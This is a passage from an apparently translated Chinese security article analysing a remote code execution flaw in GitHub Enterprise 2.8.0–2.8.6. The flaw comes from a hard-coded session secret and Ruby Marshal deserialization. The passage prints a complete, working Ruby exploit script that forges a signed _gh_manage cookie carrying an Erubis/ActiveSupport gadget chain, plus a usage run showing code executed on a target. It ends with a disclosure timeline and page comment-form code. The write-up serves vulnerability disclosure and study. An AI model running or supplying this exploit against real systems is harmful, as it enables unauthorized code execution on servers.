style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">运行Marshal.dump将这个ruby哈希值转换为字符串</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">对生成的字符串进行Base64编码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">并附加已经用密钥进行了加盐的数据哈希值，以防止篡改。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">将结果保存到_gh_manage cookie中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对来自cookie的会话数据进行反序列化处理</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">让我们通过一个例子来仔细考察反序列化的过程：为了从cookie加载数据，Rack :: Session :: Cookie需要执行相应的操作。例如，将cookie设置为下面的值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">cookie&nbsp;=&nbsp;&quot;BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTRhYjMwYjIyM2Y5MTMzMGFiMmJj%0AMjdiMDI1O&quot;+
+&quot;WY1ODkxMzA2OGNlMGVmOTM0ODA1Y2QwZGRiZGQwYTM3MTEwNzgG%0AOwBGSSIPY3NyZi50b2tlbgY7AFR&quot;+
+&quot;JIjFKMzgrbExpUnpkN3ZEazZld1N1eUhY%0AcjQ0akFlc3NjM1ZFVzArYjI3aWdNPQY7AEY%3D%0A--5e&quot;+
+&quot;b02d2e1b1845e9f766c2282de2d19dc64d0fb9&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">它根据“- -”对字符串进行拆解，处理反向url转义，并使用base64对结果进行解码，从而得到最终的二进制数据和签名。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">data,&nbsp;hmac&nbsp;=&nbsp;cookie.split(&quot;--&quot;)
+data&nbsp;=&nbsp;CGI.unescape(data).unpack(&quot;m&quot;).first
+#&nbsp;=&gt;&nbsp;data&nbsp;=&nbsp;&quot;\x04\b{\aI\&quot;\x0Fsession_id\x06:\x06ETI\&quot;E4ab30b223f91330ab2bc27b025
+#&nbsp;9f58913068ce0ef934805cd0ddbdd0a3711078\x06;\x00FI\&quot;\x0Fcsrf.token\x06;\x00TI\&quot;
+#&nbsp;1J38+lLiRzd7vDk6ewSuyHXr44jAessc3VEW0+b27igM=\x06;\x00F&quot;
+#&nbsp;=&gt;&nbsp;hmac&nbsp;=&nbsp;&quot;5eb02d2e1b1845e9f766c2282de2d19dc64d0fb9</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后计算预期的hmac：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">secret&nbsp;=&nbsp;&quot;641dd6454584ddabfed6342cc66281fb&quot;
+expected_hmac&nbsp;=&nbsp;OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new,&nbsp;secret,&nbsp;data)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果计算出的哈希值与预期的哈希值相匹配的话，则将其传递给Marshal.load。否则，将其丢弃：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;expected_hmac&nbsp;==&nbsp;hmac
+&nbsp;&nbsp;session&nbsp;=&nbsp;Marshal.load(data)
+end
+#&nbsp;=&gt;&nbsp;{&quot;session_id&quot;&nbsp;=&gt;&nbsp;&quot;4ab30b223f91330ab2bc27b0259f58913068ce0ef934805cd0ddbdd0a3711078&quot;,
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;csrf.token&quot;&nbsp;=&gt;&nbsp;&quot;J38+lLiRzd7vDk6ewSuyHXr44jAessc3VEW0+b27igM=&quot;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞分析&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上面的代码存在两个问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ENV [&quot;ENTERPRISE_SESSION_SECRET&quot;]从未进行设置，因此该密钥默认为上述值。您可以给任意Cookie进行签名并根据需要设置会话ID。但这并没有什么帮助，因为会话ID是32个随机字节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不过，你现在可以将任意数据输入Marshal.load，因为你可以伪造一个有效的签名。与JSON不同，Marshal格式不仅允许使用散列、数组和静态类型，而且还允许使用ruby对象。这就会导致远程代码执行漏洞，这一点将在下面介绍。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">制作漏洞代码</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">要想运行任意代码，我们需要生成运行反序列化代码的Marshal.load的输入。为此，我需要精心构造获访问该对象的代码。这需要分两步完成：</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">恶意ERb模板</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解析.erb模板的方式是Erubis读取模版并生成一个Erubis :: Eruby对象，该对象保存有位于@src实例变量中的模板代码。所以如果我们把自己的代码放入那里的话，那么只需要设法调用object.result，我们的代码就会得到运行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">erubis&nbsp;=&nbsp;Erubis::Eruby.allocate
+erubis.instance_variable_set&nbsp;:@src,&nbsp;&quot;%x{id&nbsp;&gt;&nbsp;/tmp/pwned};&nbsp;1&quot;
+#&nbsp;erubis.result&nbsp;would&nbsp;run&nbsp;the&nbsp;code</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一个邪恶的InstanceVariableProxy</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在ActiveSupport中，提供了一种便捷的方式来通知用户某些东西发生了变化。它被称为ActiveSupport :: Deprecation :: DeprecatedInstanceVariableProxy，我们可以通过它来废弃实例变量。如果在这个废弃的实例变量上运行方法话，它会为你调用new生成的方法并发出警告。这正是我们想要的，具体如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">proxy&nbsp;=&nbsp;ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erubis,&nbsp;:result)
+session&nbsp;=&nbsp;{&quot;session_id&quot;&nbsp;=&gt;&nbsp;&quot;&quot;,&nbsp;&quot;exploit&quot;&nbsp;=&gt;&nbsp;proxy}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果我现在访问session [“exploit”]，它会调用erubis.result，然后运行嵌入的shell命令id&gt; / tmp / pwned并返回1。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在，我们只要把它封装成一个会话cookie，用密钥进行签名，就可以进行完成远程代码执行攻击了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞利用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">下面是我提供给GitHub的完整漏洞利用代码，注意，它仅限于教育用途。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/ruby
+require&nbsp;&quot;openssl&quot;
+require&nbsp;&quot;cgi&quot;
+require&nbsp;&quot;net/http&quot;
+require&nbsp;&quot;uri&quot;
+SECRET&nbsp;=&nbsp;&quot;641dd6454584ddabfed6342cc66281fb&quot;
+puts&nbsp;&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___.&nbsp;&nbsp;&nbsp;.__&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;
+puts&nbsp;&#39;&nbsp;&nbsp;____&nbsp;___&nbsp;&nbsp;________&nbsp;\_&nbsp;|__&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;__&nbsp;__&nbsp;&nbsp;&nbsp;____&nbsp;&nbsp;&#39;
+puts&nbsp;&#39;_/&nbsp;__&nbsp;\\\\&nbsp;&nbsp;\/&nbsp;&nbsp;/\__&nbsp;&nbsp;\&nbsp;|&nbsp;__&nbsp;\|&nbsp;&nbsp;|&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;\_/&nbsp;__&nbsp;\&nbsp;&#39;
+puts&nbsp;&#39;\&nbsp;&nbsp;___/&nbsp;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&nbsp;&nbsp;/&nbsp;__&nbsp;\|&nbsp;\_\&nbsp;\&nbsp;&nbsp;|_|&nbsp;&nbsp;|&nbsp;&nbsp;/\&nbsp;&nbsp;___/&nbsp;&#39;
+puts&nbsp;&#39;&nbsp;\___&nbsp;&nbsp;&gt;__/\_&nbsp;\(____&nbsp;&nbsp;/___&nbsp;&nbsp;/____/____/&nbsp;&nbsp;\___&nbsp;&nbsp;&gt;&#39;
+puts&nbsp;&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&#39;
+puts&nbsp;&#39;&#39;
+puts&nbsp;&quot;github&nbsp;Enterprise&nbsp;RCE&nbsp;exploit&quot;
+puts&nbsp;&quot;Vulnerable:&nbsp;2.8.0&nbsp;-&nbsp;2.8.6&quot;
+puts&nbsp;&quot;(C)&nbsp;2017&nbsp;iblue&nbsp;&lt;iblue@exablue.de&gt;&quot;
+unless&nbsp;ARGV[0]&nbsp;&amp;&amp;&nbsp;ARGV[1]
+&nbsp;&nbsp;puts&nbsp;&quot;Usage:&nbsp;./exploit.rb&nbsp;&lt;hostname&gt;&nbsp;&lt;valid&nbsp;ruby&nbsp;code&gt;&quot;
+&nbsp;&nbsp;puts&nbsp;&quot;&quot;
+&nbsp;&nbsp;puts&nbsp;&quot;Example:&nbsp;./exploit.rb&nbsp;ghe.example.org&nbsp;\&quot;%x(id&nbsp;&gt;&nbsp;/tmp/pwned)\&quot;&quot;
+&nbsp;&nbsp;exit&nbsp;1
+end
+hostname&nbsp;=&nbsp;ARGV[0]
+code&nbsp;=&nbsp;ARGV[1]
+#&nbsp;First&nbsp;we&nbsp;get&nbsp;the&nbsp;cookie&nbsp;from&nbsp;the&nbsp;host&nbsp;to&nbsp;check&nbsp;if&nbsp;the&nbsp;instance&nbsp;is&nbsp;vulnerable.
+puts&nbsp;&quot;[+]&nbsp;Checking&nbsp;if&nbsp;#{hostname}&nbsp;is&nbsp;vulnerable...&quot;
+http&nbsp;=&nbsp;Net::HTTP.new(hostname,&nbsp;8443)
+http.use_ssl&nbsp;=&nbsp;true
+http.verify_mode&nbsp;=&nbsp;OpenSSL::SSL::VERIFY_NONE&nbsp;#&nbsp;We&nbsp;may&nbsp;deal&nbsp;with&nbsp;self-signed&nbsp;certificates
+rqst&nbsp;=&nbsp;Net::HTTP::Get.new(&quot;/&quot;)
+while&nbsp;res&nbsp;=&nbsp;http.request(rqst)
+&nbsp;&nbsp;case&nbsp;res
+&nbsp;&nbsp;when&nbsp;Net::HTTPRedirection&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;puts&nbsp;&quot;&nbsp;&nbsp;=&gt;&nbsp;Following&nbsp;redirect&nbsp;to&nbsp;#{res[&quot;location&quot;]}...&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;rqst&nbsp;=&nbsp;Net::HTTP::Get.new(res[&quot;location&quot;])
+&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;end
+end
+def&nbsp;not_vulnerable
+&nbsp;&nbsp;puts&nbsp;&quot;&nbsp;&nbsp;=&gt;&nbsp;Host&nbsp;is&nbsp;not&nbsp;vulnerable&quot;
+&nbsp;&nbsp;exit&nbsp;1
+end
+unless&nbsp;res[&#39;Set-Cookie&#39;]&nbsp;=~&nbsp;/\A_gh_manage/
+&nbsp;&nbsp;not_vulnerable
+end
+#&nbsp;Parse&nbsp;the&nbsp;cookie
+begin
+&nbsp;&nbsp;value&nbsp;=&nbsp;res[&#39;Set-Cookie&#39;].split(&quot;=&quot;,&nbsp;2)[1]
+&nbsp;&nbsp;data&nbsp;=&nbsp;CGI.unescape(value.split(&quot;--&quot;).first)
+&nbsp;&nbsp;hmac&nbsp;=&nbsp;value.split(&quot;--&quot;).last.split(&quot;;&quot;,&nbsp;2).first
+&nbsp;&nbsp;expected_hmac&nbsp;=&nbsp;OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new,&nbsp;SECRET,&nbsp;data)
+&nbsp;&nbsp;not_vulnerable&nbsp;if&nbsp;expected_hmac&nbsp;!=&nbsp;hmac
+rescue
+&nbsp;&nbsp;not_vulnerable
+end
+puts&nbsp;&quot;&nbsp;&nbsp;=&gt;&nbsp;Host&nbsp;is&nbsp;vulnerable&quot;
+#&nbsp;Now&nbsp;construct&nbsp;the&nbsp;cookie
+puts&nbsp;&quot;[+]&nbsp;Assembling&nbsp;magic&nbsp;cookie...&quot;
+#&nbsp;Stubs,&nbsp;since&nbsp;we&nbsp;don&#39;t&nbsp;want&nbsp;to&nbsp;execute&nbsp;the&nbsp;code&nbsp;locally.
+module&nbsp;Erubis;class&nbsp;Eruby;end;end
+module&nbsp;ActiveSupport;module&nbsp;Deprecation;class&nbsp;DeprecatedInstanceVariableProxy;end;end;end
+erubis&nbsp;=&nbsp;Erubis::Eruby.allocate
+erubis.instance_variable_set&nbsp;:@src,&nbsp;&quot;#{code};&nbsp;1&quot;
+proxy&nbsp;=&nbsp;ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
+proxy.instance_variable_set&nbsp;:@instance,&nbsp;erubis
+proxy.instance_variable_set&nbsp;:@method,&nbsp;:result
+proxy.instance_variable_set&nbsp;:@var,&nbsp;&quot;@result&quot;
+session&nbsp;=&nbsp;{&quot;session_id&quot;&nbsp;=&gt;&nbsp;&quot;&quot;,&nbsp;&quot;exploit&quot;&nbsp;=&gt;&nbsp;proxy}
+#&nbsp;Marshal&nbsp;session
+dump&nbsp;=&nbsp;[Marshal.dump(session)].pack(&quot;m&quot;)
+hmac&nbsp;=&nbsp;OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new,&nbsp;SECRET,&nbsp;dump)
+puts&nbsp;&quot;[+]&nbsp;Sending&nbsp;cookie...&quot;
+rqst&nbsp;=&nbsp;Net::HTTP::Get.new(&quot;/&quot;)
+rqst[&#39;Cookie&#39;]&nbsp;=&nbsp;&quot;_gh_manage=#{CGI.escape(&quot;#{dump}--#{hmac}&quot;)}&quot;
+res&nbsp;=&nbsp;http.request(rqst)
+if&nbsp;res.code&nbsp;==&nbsp;&quot;302&quot;
+&nbsp;&nbsp;puts&nbsp;&quot;&nbsp;&nbsp;=&gt;&nbsp;Code&nbsp;executed.&quot;
+else
+&nbsp;&nbsp;puts&nbsp;&quot;&nbsp;&nbsp;=&gt;&nbsp;Something&nbsp;went&nbsp;wrong.&quot;
+end</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">用法示例&nbsp;</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">iblue@raven:/tmp$&nbsp;ruby&nbsp;exploit.rb&nbsp;192.168.1.165&nbsp;&quot;%x(id&nbsp;&gt;&nbsp;/tmp/pwned)&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___.&nbsp;&nbsp;&nbsp;.__
+&nbsp;&nbsp;____&nbsp;___&nbsp;&nbsp;________&nbsp;\_&nbsp;|__&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;__&nbsp;__&nbsp;&nbsp;&nbsp;____
+_/&nbsp;__&nbsp;\\&nbsp;&nbsp;\/&nbsp;&nbsp;/\__&nbsp;&nbsp;\&nbsp;|&nbsp;__&nbsp;\|&nbsp;&nbsp;|&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;\_/&nbsp;__&nbsp;\
+\&nbsp;&nbsp;___/&nbsp;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&nbsp;&nbsp;/&nbsp;__&nbsp;\|&nbsp;\_\&nbsp;\&nbsp;&nbsp;|_|&nbsp;&nbsp;|&nbsp;&nbsp;/\&nbsp;&nbsp;___/
+&nbsp;\___&nbsp;&nbsp;&gt;__/\_&nbsp;\(____&nbsp;&nbsp;/___&nbsp;&nbsp;/____/____/&nbsp;&nbsp;\___&nbsp;&nbsp;&gt;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/
+[+]&nbsp;Checking&nbsp;if&nbsp;192.168.1.165&nbsp;is&nbsp;vulnerable...
+&nbsp;&nbsp;=&gt;&nbsp;Following&nbsp;redirect&nbsp;to&nbsp;/setup/...
+&nbsp;&nbsp;=&gt;&nbsp;Following&nbsp;redirect&nbsp;to&nbsp;https://192.168.1.165:8443/setup/unlock?redirect_to=/...
+&nbsp;&nbsp;=&gt;&nbsp;Host&nbsp;is&nbsp;vulnerable
+[+]&nbsp;Assembling&nbsp;magic&nbsp;cookie...
+[+]&nbsp;Sending&nbsp;cookie...
+&nbsp;&nbsp;=&gt;&nbsp;Code&nbsp;executed.
+iblue@raven:/tmp$&nbsp;ssh&nbsp;-p122&nbsp;admin@192.168.1.165
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___&nbsp;_&nbsp;_&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_
+&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;__(_)&nbsp;|_|&nbsp;||&nbsp;|_&nbsp;&nbsp;_|&nbsp;|__&nbsp;&nbsp;|&nbsp;__|_&nbsp;_|&nbsp;|_&nbsp;___&nbsp;_&nbsp;_&nbsp;_&nbsp;__&nbsp;_&nbsp;_(_)___&nbsp;___
+&nbsp;&nbsp;&nbsp;|&nbsp;(_&nbsp;|&nbsp;|&nbsp;&nbsp;_|&nbsp;__&nbsp;|&nbsp;||&nbsp;|&nbsp;&#39;_&nbsp;\&nbsp;|&nbsp;_||&nbsp;&#39;&nbsp;\&nbsp;&nbsp;_/&nbsp;-_)&nbsp;&#39;_|&nbsp;&#39;_&nbsp;\&nbsp;&#39;_|&nbsp;(_-&lt;/&nbsp;-_)
+&nbsp;&nbsp;&nbsp;&nbsp;\___|_|\__|_||_|\_,_|_.__/&nbsp;|___|_||_\__\___|_|&nbsp;|&nbsp;.__/_|&nbsp;|_/__/\___|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|
+Administrative&nbsp;shell&nbsp;access&nbsp;is&nbsp;permitted&nbsp;for&nbsp;troubleshooting&nbsp;and&nbsp;performing
+documented&nbsp;operations&nbsp;procedures&nbsp;only.&nbsp;Modifying&nbsp;system&nbsp;and&nbsp;application&nbsp;files,
+running&nbsp;programs,&nbsp;or&nbsp;installing&nbsp;unsupported&nbsp;software&nbsp;packages&nbsp;may&nbsp;void&nbsp;your
+support&nbsp;contract.&nbsp;Please&nbsp;contact&nbsp;GitHub&nbsp;Enterprise&nbsp;technical&nbsp;support&nbsp;at
+enterprise@github.com&nbsp;if&nbsp;you&nbsp;have&nbsp;a&nbsp;question&nbsp;about&nbsp;the&nbsp;activities&nbsp;allowed&nbsp;by
+your&nbsp;support&nbsp;contract.
+Last&nbsp;login:&nbsp;Thu&nbsp;Jan&nbsp;26&nbsp;10:10:19&nbsp;2017&nbsp;from&nbsp;192.168.1.145
+admin@ghe-deepmagic-de:~$&nbsp;cat&nbsp;/tmp/pwned&nbsp;
+uid=605(enterprise-manage)&nbsp;gid=605(enterprise-manage)&nbsp;groups=605(enterprise-manage)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">时间线</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">2017年1月26日 将问题报告给GitHub</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2017年1月26日 GitHub将问题分类</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2017年1月31日 被要求更新</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2017年1月31日 &nbsp;GitHub颁发一万美元的赏金、T恤、几张贴纸和一个免费的个人计划。哈哈，名人堂也有俺的一席之地了， 真棒！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2017年1月31日 GitHub Enterprise 2.8.7发布</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2017年3月14日 在完成本文的时候，GitHub又支付了8000美元。Wow。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">致谢</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">特别感谢Phenoelit的joernchen撰写的关于ruby的安全文章，这里的漏洞利用代码借鉴了他的思路，非常感谢！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此外，我还要特别感谢Orange，正是他关于攻击GitHub企业版方面的博客文章才引起了我对这方面的兴趣。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html" target="_blank">原文链接：http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【漏洞分析】Github企业版远程代码执行漏洞分析 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3614" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
